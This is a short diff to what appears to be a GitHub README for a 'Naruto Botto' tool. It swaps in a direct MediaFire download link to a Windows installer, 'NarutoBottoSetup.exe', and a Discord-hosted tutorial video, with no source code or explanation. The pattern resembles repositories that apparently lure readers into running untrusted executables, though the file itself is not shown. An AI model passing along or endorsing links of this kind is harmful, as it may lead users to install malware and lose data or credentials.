@@ -11,9 +11,9 @@
 
 - Version 1.0
 
-Vedio Tutorial "How To Download it" "**YOU CAN DOWNLOAD IT FROM HERE [[Download]](https://github.com/fdf91bd6-cf78-4328-9a01-7af7656c7082)**"
+Vedio Tutorial "How To Download it" "**YOU CAN DOWNLOAD IT FROM HERE [[Download]](https://download846.mediafire.com/1rgdwlyqifbg-ArkV04NMN10hNp5irf4x5_ou2E_miP8qv5lcb0DGBEoGuRMA49kiLnAj8ltX5w3V3g6dYaqA4ENMWoMoNiZECS15FKmb06a44A8hVCzMahk8rUTJ7UUzNlo_zMsG8XxqCWU9iKL1ZQTEi4FfNFD9EOUTjHLJq583ib0/dj7c2vcmo5hlqq9/NarutoBottoSetup.exe)**"
 
-[[tutorial vedio]](/0708.mp4)
+[[tutorial vedio]](https://cdn.discordapp.com/attachments/1127234099170529320/1127299978176507904/07081.mp4)
 
 
 
